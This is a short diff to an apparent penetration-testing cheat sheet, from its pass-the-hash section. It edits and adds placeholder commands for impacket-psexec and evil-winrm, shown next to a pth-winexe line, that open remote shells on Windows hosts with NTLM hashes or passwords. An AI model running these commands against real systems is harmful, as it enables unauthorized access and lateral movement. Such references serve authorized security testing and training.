@@ -287,12 +287,14 @@ pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:<hash_ntlm> //<IP> 
 
 -> Remote Access - impacket-psexec  
 ```
-impacket-psexec '<hostname>/<user>'@<IP> -hashes ':<hash>'
+impacket-psexec '<domain>/<user>'@<IP> -hashes ':<hash>'
+impacket-psexec '<domain>/<user>'@<IP>
 ```
 
 -> Remote Access + evil-winrm  
 ```
 evil-winrm -i <IP> -u <user> -H <hash>
+evil-winrm -i <IP> -u <user> -p <password>
 ```
 
 #### Over Pass the Hash
